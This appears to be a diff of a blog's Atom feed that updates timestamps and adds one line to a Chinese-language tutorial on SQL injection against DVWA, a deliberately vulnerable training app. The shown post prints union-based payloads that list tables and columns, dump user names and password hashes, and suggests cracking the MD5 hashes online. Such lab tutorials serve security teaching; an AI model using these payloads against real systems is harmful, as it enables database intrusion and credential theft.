@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://t1ger.github.io/"/>
-  <updated>2016-11-20T05:45:46.183Z</updated>
+  <updated>2016-11-20T05:58:44.255Z</updated>
   <id>https://t1ger.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="https://t1ger.github.io/2016/11/20/dvwa%E5%B9%B3%E5%8F%B0%E6%B5%8B%E8%AF%95sql%E6%B3%A8%E5%85%A5/"/>
     <id>https://t1ger.github.io/2016/11/20/dvwa平台测试sql注入/</id>
     <published>2016-11-20T03:28:59.000Z</published>
-    <updated>2016-11-20T05:45:46.183Z</updated>
+    <updated>2016-11-20T05:58:44.255Z</updated>
     
     <content type="html"><![CDATA[<p>前言<br>先做个简单介绍：DVWA(Dam Vulnerable Web Application)环境演示，DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。<br>本文所有演示操作都是在此环境中,本文是帮助用户了解信息安全技术、安全漏洞相关信息，不承担任何法律及连带责任</p>
 <p>我们的测试环境：<br>测试平台：dvwa<br>渗透工具推荐：burpsuite<br>本次测试主要针对mysql数据库，针对不同的数据库平台，注入语句需要做相应更改</p>
@@ -53,6 +53,7 @@
 <p>构造的查询语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div></pre></td></tr></table></figure></p>
 <p>返回如下信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: guestbook</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#</div><div class="line">First name: users</div><div class="line">Surname: 2</div></pre></td></tr></table></figure></p>
 <p>出来两个表，对那个感兴趣呢？？？当然是users表啦！不是说还有一个columns表么？所以我们还需要table_name以及table_schema来查column_name。这次我们构造的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div></pre></td></tr></table></figure></p>
+<p>返回如下信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user_id</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: first_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: last_name</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: user</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: password</div><div class="line">Surname: 2</div><div class="line">ID: -1&apos; union select column_name,2 from information_schema.columns where table_schema= &apos;dvwa&apos; and table_name= &apos;users&apos;#</div><div class="line">First name: avatar</div><div class="line">Surname: 2</div></pre></td></tr></table></figure>
 <p>这么多数据，选哪个呢？？？废话，当然是user，password啦。我们再次修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-1&apos; union select user,password from users#</div></pre></td></tr></table></figure></p>
 <p>终于返回我们想看的数据了，不过貌似密码是md5加密过的，这能难倒我们么，找度娘帮忙，找一些破解md5值的网站来进行破解<br>之后返回登陆界面验证下</p>
